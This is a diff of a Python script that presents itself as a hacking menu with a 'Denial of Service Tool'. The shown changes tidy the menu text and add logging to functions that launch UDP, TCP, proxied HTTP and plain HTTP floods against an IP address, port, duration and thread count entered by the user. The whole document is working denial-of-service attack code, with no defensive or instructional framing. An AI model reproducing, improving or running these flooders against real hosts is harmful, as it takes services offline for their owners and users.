@@ -44,7 +44,7 @@ db   8D 88  V888 88b  d88 88      88
 
 #----------------#
 def main():
-  print("1 - Vulnerability Detection \n[2 - Denial of Service Tool \n[Select a number from 1 to 2:")
+  print("1 - Vulnerability Detection \n2 - Denial of Service Tool \nSelect a number from 1 to 2:")
   n = int(input())
 
 
@@ -87,7 +87,7 @@ def udp():
   ip = input("Enter IP Address: ")
   port = int(input("Port: "))
   time = int(input("Time: "))
-  bane.udp_flood(ip, p=port, min_size=10, max_size=20, duration=time, interval=0.001)
+  bane.udp_flood(ip, p=port, min_size=10, max_size=20, duration=time, interval=0.001, logs=True)
 
 def tcp():
   os.system("clear || cls")
@@ -96,7 +96,7 @@ def tcp():
   port = int(input("Port: "))
   time = int(input("Time: "))
   thread = int(input("Threads: "))
-  bane.tcp_flood(ip, p=port, min_size=10, max_size=20, duration=time, interval=0.001, threads=thread, timeout=5)
+  bane.tcp_flood(ip, p=port, min_size=10, max_size=20, duration=time, interval=0.001, threads=thread, timeout=5, logs=True)
 
 def http():
   os.system("clear || cls")
@@ -117,7 +117,7 @@ def httproxy():
   port = int(input("Port: "))
   time = int(input("Time: "))
   thread = int(input("Threads: "))
-  bane.prox_http_spam(ip, p=port, duration=time,interval=0.001, threads=thread, timeout=5)
+  bane.prox_http_spam(ip, p=port, duration=time,interval=0.001, threads=thread, timeout=5, logs=True)
 
 def httpbasic():
   os.system("clear || cls")
@@ -126,7 +126,7 @@ def httpbasic():
   port = int(input("Port: "))
   time = int(input("Time: "))
   thread = int(input("Threads: "))
-  bane.http_spam(ip, p=port, duration=time,interval=0.001, threads=thread, timeout=5)
+  bane.http_spam(ip, p=port, duration=time,interval=0.001, threads=thread, timeout=5, logs=True)
 
 #----------------#
 
